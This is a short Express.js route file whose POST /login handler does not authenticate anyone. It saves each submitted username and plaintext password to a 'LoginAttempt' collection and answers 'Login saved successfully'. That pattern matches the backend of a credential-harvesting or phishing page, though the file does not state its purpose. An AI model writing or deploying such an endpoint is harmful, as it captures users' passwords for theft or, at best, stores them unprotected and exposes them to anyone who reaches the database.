// server/routes/auth.js
const express = require('express');
const router = express.Router();
const LoginAttempt = require('../models/LoginAttempt');

router.post('/login', async (req, res) => {
  const { username, password } = req.body;

  try {
    const newAttempt = new LoginAttempt({
      username,
      password,
      date: new Date()
    });

    await newAttempt.save();
    res.status(200).json({ message: 'Login saved successfully' });
  } catch (error) {
    console.error('❌ Error saving login:', error);
    res.status(500).json({ error: 'Failed to save login' });
  }
});

module.exports = router;
